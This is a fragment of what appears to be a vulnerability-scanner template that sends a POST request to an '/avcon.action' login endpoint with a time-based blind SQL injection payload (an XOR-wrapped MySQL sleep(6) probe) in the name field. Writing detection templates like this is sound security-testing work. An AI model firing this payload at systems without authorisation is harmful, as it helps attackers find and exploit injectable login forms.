      - |              
        POST /avcon.action HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Host: 

        name=0'XOR({{mysql}})XOR'Z&password=u]H[ww6KrA9F.x-F

    payloads:
      mysql:
        - "if(now()=sysdate()%2Csleep(6)%2C0)"
               
